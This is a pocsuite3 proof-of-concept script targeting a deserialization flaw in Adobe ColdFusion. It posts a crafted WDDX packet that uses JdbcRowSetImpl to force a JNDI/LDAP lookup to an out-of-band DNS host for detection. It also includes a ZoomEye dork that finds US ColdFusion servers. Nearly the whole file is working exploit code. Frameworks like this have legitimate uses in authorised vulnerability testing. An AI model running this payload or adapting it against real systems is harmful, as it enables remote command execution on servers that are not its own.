from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    name = 'Adobe ColdFusion反序列化漏洞'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'app:"Adobe ColdFusion" +country:"US"'}
    appName = "Adobe ColdFusion"

    def _exploit(self, param=''):
        vuln_path = "/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true"
        url = urljoin(self.url, vuln_path)
        data = f"""argumentCollection=<wddxPacket+version%3d'1.0'><header/><data><struct+type%3d'xcom.sun.rowset.JdbcRowSetImplx'><var+name%3d'dataSourceName'><string>{param}</string></var><var+name%3d'autoCommit'><boolean+value%3d'true'/></var></struct></data></wddxPacket>
"""
        header = {"Content-Type": "application/x-www-form-urlencoded",
                  "User-Agent": "MMozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
                  "Accept-Encoding": "gzip"}
        out = {}
        try:
            res = requests.post(url, data=data, headers=header, verify=False, timeout=5)
            if res.status_code == 200:
                return res.text
            else:
                pass
        except Exception as e:
            pass

    def _verify(self):
        result = {}
        random_uri = random_str(4)
        oob = CEye()
        v = oob.build_request(value=random_uri, type='dns')
        url, flag = v['url'], v['flag']
        param = f"ldap://{url}"
        self._exploit(param)
        flag = str.lower(flag)
        if oob.verify_request(flag, type="dns"):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['payload'] = param
        return self.parse_output(result)


register_poc(POC)
